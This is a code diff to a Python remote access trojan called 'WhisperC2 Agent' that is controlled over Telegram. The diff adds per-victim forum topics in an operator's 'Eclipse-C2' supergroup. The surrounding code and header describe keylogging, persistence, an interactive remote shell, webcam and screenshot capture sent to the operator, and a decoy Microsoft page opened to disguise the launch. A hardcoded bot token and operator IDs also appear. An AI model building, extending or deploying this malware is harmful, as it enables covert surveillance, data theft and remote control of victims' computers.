@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 # =============================================================================
-# 🌈 WhisperC2 Agent – Colourful Final Build (v1.0)
+# 🌈 WhisperC2 Agent – Final Build (v1.0) with Forum‑Topic Isolation
 #    ✅ PeekNamedPipe deadlock fix
 #    ✅ Markdown rendering (parse_mode='Markdown') + sanitise_markdown()
 #    ✅ Keylogger buffer overflow fixed
 #    ✅ DEX cleanup via MoveFileExW (MOVEFILE_DELAY_UNTIL_REBOOT)
 #    ✅ Shell encoding uses system OEM code page
 #    ✅ Persistence skipped when running as script (non‑frozen)
-#    ✅ All commands re‑coloured with emojis
+#    ✅ Auto‑creates dedicated forum topic in Eclipse‑C2 supergroup
 # =============================================================================
 import cv2, time, telebot, platform, subprocess, threading
 from pynput import keyboard
@@ -26,7 +26,7 @@ import random, string
 # -----------------------------------------------------------------------------
 BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
 OPERATOR_CHAT_ID = 5178265082          # your personal Telegram ID
-GROUP_CHAT_ID = -1003972714956         # Eclipse‑C2 supergroup (not used for targeting)
+GROUP_CHAT_ID = -1003972714956         # Eclipse‑C2 supergroup
 DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"
 
 # -----------------------------------------------------------------------------
@@ -45,7 +45,7 @@ log_lines = []
 def log(msg: str) -> None:
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_lines.append(f"[{timestamp}] {msg}")
-    print(f"🌟 {msg}")   # colourful console output
+    print(f"🌟 {msg}")
 
 def send_log_to_telegram(bot_instance) -> None:
     if not log_lines:
@@ -648,22 +648,30 @@ def execute_command(cmd_line: str) -> tuple:
         return f"❓ Unknown command: {cmd}", None
 
 # -----------------------------------------------------------------------------
-# 📨 Telegram message handler
+# 📨 Telegram message handler – now replies inside the agent's forum topic
 # -----------------------------------------------------------------------------
+TOPIC_ID = None   # will be set after creating the forum topic
+
 def message_handler(message) -> None:
+    # Only respond to commands from the operator
     if message.from_user.id != OPERATOR_CHAT_ID:
+        return
+
+    # If the message is in the main group (not a topic), ignore it – we only work in topics
+    if hasattr(message, 'message_thread_id') and message.message_thread_id is None:
         return
 
     text = message.text.strip()
     if not text:
         return
 
-    # Interactive shell forwarding
+    # --- Interactive shell forwarding ---
     if shell_active:
         clean = text[1:] if text.startswith('/') else text
         if clean.lower() == "exit":
             kill_shell()
-            bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown')
+            bot.reply_to(message, "💬 Shell closed.",
+                         parse_mode='Markdown', message_thread_id=TOPIC_ID)
         elif clean.lower().startswith("die"):
             kill_shell()
             execute_command("die")
@@ -671,11 +679,11 @@ def message_handler(message) -> None:
             write_shell(clean)
         return
 
-    # Normal command processing
+    # --- Normal command processing ---
     if text.startswith('/'):
         text = text[1:]
 
-    # Multi‑agent targeting (optional)
+    # Multi‑agent targeting (optional – can still be used inside a topic)
     target_id = None
     command_portion = text
     if text.upper().startswith("ALL:"):
@@ -695,39 +703,43 @@ def message_handler(message) -> None:
 
     response, file_path = execute_command(command_portion)
 
+    # --- Send response into the agent's forum topic ---
     if command_portion.startswith("die"):
-        bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown')
+        bot.reply_to(message, f"```\n{response}\n```",
+                     parse_mode='Markdown', message_thread_id=TOPIC_ID)
         os._exit(0)
 
     safe_response = sanitise_markdown(response)
     try:
-        bot.reply_to(message, f"```\n{safe_response}\n```", parse_mode='Markdown')
+        bot.reply_to(message, f"```\n{safe_response}\n```",
+                     parse_mode='Markdown', message_thread_id=TOPIC_ID)
     except:
-        bot.reply_to(message, safe_response, parse_mode=None)
+        bot.reply_to(message, safe_response,
+                     parse_mode=None, message_thread_id=TOPIC_ID)
 
+    # --- Send any generated file (screenshot, webcam, etc.) into the topic ---
     if file_path and os.path.exists(file_path):
         try:
             with open(file_path, 'rb') as f:
                 if file_path.endswith(('.png', '.jpg', '.jpeg')):
-                    bot.send_photo(message.chat.id, f)
+                    bot.send_photo(message.chat.id, f, message_thread_id=TOPIC_ID)
                 elif file_path.endswith(('.mp4', '.avi')):
-                    bot.send_video(message.chat.id, f)
+                    bot.send_video(message.chat.id, f, message_thread_id=TOPIC_ID)
                 else:
-                    bot.send_document(message.chat.id, f)
+                    bot.send_document(message.chat.id, f, message_thread_id=TOPIC_ID)
         except Exception as e:
             log(f"❌ File send error: {e}")
-            bot.reply_to(message, f"❌ Error sending file: {e}")
         finally:
             try:
                 os.remove(file_path)
             except:
                 pass
 
-# Catch‑all for any text that isn't a recognised command
+# Catch‑all for any text that isn't a recognised command – also replies in the topic
 bot.message_handler(func=lambda msg: True)(message_handler)
 
 # -----------------------------------------------------------------------------
-# 🚀 Main
+# 🚀 Main – creates a dedicated forum topic and enters the polling loop
 # -----------------------------------------------------------------------------
 if __name__ == "__main__":
     log("🚀 Agent starting")
@@ -737,6 +749,20 @@ if __name__ == "__main__":
         log("💾 Persistence installed")
 
     log(f"🆔 Agent ID: {SYSTEM_ID}")
+
+    # --- Create a dedicated forum topic for this agent ---
+    try:
+        new_topic = bot.create_forum_topic(
+            GROUP_CHAT_ID,
+            SYSTEM_ID,
+            icon_color=0x6FB9F0       # optional blue colour
+        )
+        TOPIC_ID = new_topic.message_thread_id
+        log(f"📁 Created forum topic #{TOPIC_ID} in Eclipse‑C2")
+    except Exception as e:
+        log(f"⚠️ Could not create forum topic: {e}")
+        # If creation fails, we'll still run but replies go to the main group
+        TOPIC_ID = None
 
     send_log_to_telegram(bot)
     webbrowser.open(DECOY_URL)
